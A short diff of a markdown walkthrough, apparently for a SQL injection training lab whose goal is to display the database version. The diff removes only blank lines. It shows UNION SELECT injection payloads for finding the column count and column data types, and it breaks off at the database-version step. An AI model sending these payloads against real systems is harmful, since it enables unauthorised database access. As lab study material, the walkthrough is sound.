@@ -15,13 +15,11 @@ To solve the lab, display the database version string.
 ' UNION SELECT NULL, NULL--%20
 ```
 
-
 2/ Determine the data type of columns
 
 ```sql
 ' UNION SELECT 'AAA', 'AAA'--%20
 ```
-
 
 3/ Determine the type and version of the database
 
